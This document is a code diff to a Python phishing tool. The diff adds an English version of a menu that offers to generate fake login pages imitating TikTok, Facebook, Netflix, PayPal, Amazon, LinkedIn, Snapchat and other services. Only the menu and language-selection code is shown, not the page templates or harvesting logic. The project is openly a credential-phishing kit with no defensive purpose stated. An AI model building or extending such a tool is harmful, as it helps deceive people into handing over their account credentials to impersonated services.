@@ -2,16 +2,17 @@ from colorama import init, Fore, Style
 import webbrowser  
 import os 
 
+
 init(autoreset=True)
+
 
 def afficher_menu_phishing(langue_actuelle):
    
-
-    print(f"""{Fore.CYAN}{Style.BRIGHT}
-══════════════════════════════════════════════════════════════════════
-          ASCII ART PHISHING TOOL HERE
-══════════════════════════════════════════════════════════════════════
+    def menu_fr():
+        print(f"""{Fore.CYAN}{Style.BRIGHT}
 {Fore.MAGENTA}  🌐 Générateur de fausse page HTML
+
+
 
 {Fore.YELLOW}              [1] TikTok
               [2] Instagram (En cours de maintenance)
@@ -28,6 +29,29 @@ def afficher_menu_phishing(langue_actuelle):
         
 """)
     
+    def menu_en():
+        print(f"""{Fore.CYAN}{Style.BRIGHT}
+              {Fore.MAGENTA}  🌐 Fake HTML Page Generator
+
+
+{Fore.YELLOW}              [1] TikTok
+              [2] Instagram (Under maintenance)
+              [3] Facebook   
+              [4] Google (Under maintenance)
+              [5] Netflix
+              [6] PayPal
+              [7] Amazon
+              [8] Twitter (X) (Under maintenance)
+              [9] LinkedIn
+              [10] Snapchat
+              [12] Back to main menu
+              """)
+    
+    if langue_actuelle == "FR":
+        menu_fr()
+    else:
+        menu_en()
+
     choix_local = int(input(Fore.CYAN + ("Enter choice: " if langue_actuelle == "EN" else "Entrez votre choix : ")))
     
     
